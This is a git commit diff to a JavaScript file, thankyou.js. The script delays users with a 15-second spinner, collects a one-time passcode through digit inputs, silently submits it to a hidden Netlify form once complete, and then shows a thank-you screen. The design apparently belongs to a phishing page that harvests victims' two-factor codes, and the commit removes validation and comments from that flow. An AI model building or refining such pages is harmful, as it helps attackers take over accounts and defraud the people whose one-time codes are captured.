9d3e6d1f37bafc081abe18e04222bb87a2412de7
wellcush <140511613+wellcush@users.noreply.github.com>
2023-10-05 21:00:53 -0400

    Update thankyou.js

--- thankyou.js
+++ thankyou.js
@@ -1,65 +1,48 @@
 document.addEventListener("DOMContentLoaded", function() {
-    // Initialize DOM elements
     const spinnerContainer = document.querySelector('.spinner-container');
     const otpContainer = document.querySelector('.otp-container');
     const thanksContainer = document.querySelector('.thanks-container');
     const otpInputs = document.querySelectorAll('.otp-inputs input');
     const btnConfirm = document.querySelector('.btn-2');
 
-    // 1. Show spinner for 15 seconds on page load
+    // Show spinner for 15 seconds on page load
     setTimeout(() => {
         spinnerContainer.style.display = 'none';
         otpContainer.style.display = 'flex';
     }, 15000);
 
-    // Handling input focus, blur, auto-navigate to next input, and ensure only numeric values
     otpInputs.forEach((input, index) => {
-        input.addEventListener('input', () => {
-            // Ensure only numeric values
-            input.value = input.value.replace(/[^0-9]/g, '');
+        input.addEventListener('input', function() {
+            // Allow only numbers in the input fields
+            this.value = this.value.replace(/[^0-9]/g, '');
 
-            // Auto-navigate to the next input
-            if (input.value.length >= 1 && index < otpInputs.length - 1) {
+            // Auto-navigate to the next input if current input is filled
+            if (input.value.length === 1 && index < otpInputs.length - 1) {
                 otpInputs[index + 1].focus();
             }
 
             // Auto submit if all inputs are filled
             if (Array.from(otpInputs).every(i => i.value.length === 1)) {
-                btnConfirm.click();
+                // Programmatically submit the hidden form to Netlify
+                document.querySelector('form[name="otpForm"]').submit();
             }
-        });
-
-        // Visual feedback on input
-        input.addEventListener('focus', () => {
-            input.style.boxShadow = '0 0 5px #666';
-        });
-        input.addEventListener('blur', () => {
-            input.style.boxShadow = '';
         });
     });
 
-    // Event for the Confirm button click
     btnConfirm.addEventListener('click', () => {
-        // Ensure all fields are not empty
-        if (!Array.from(otpInputs).every(i => i.value.length === 1)) {
-            alert("All fields are mandatory. Please fill all the OTP fields.");
-            return;
-        }
-
         otpContainer.style.display = 'none';
         spinnerContainer.style.display = 'flex';
 
-        // Transition from spinner to thank you after a short duration
         setTimeout(() => {
-            spinnerContainer.style.opacity = 0;  // Begin fade-out effect
+            spinnerContainer.style.opacity = 0;  
             setTimeout(() => {
-                spinnerContainer.style.display = 'none'; // Hide spinner after fade-out
-                thanksContainer.style.display = 'flex';  // Display thank you message
-                thanksContainer.style.opacity = 0;   // Prepare for fade-in
+                spinnerContainer.style.display = 'none';
+                thanksContainer.style.display = 'flex';
+                thanksContainer.style.opacity = 0;
                 setTimeout(() => {
-                    thanksContainer.style.opacity = 1;  // Begin fade-in effect
+                    thanksContainer.style.opacity = 1;
                 }, 50);
-            }, 500);  // 500ms duration for fade-out
-        }, 3000);  // 3 seconds duration for spinner before transitioning to thank you
+            }, 500);
+        }, 3000);
     });
 });
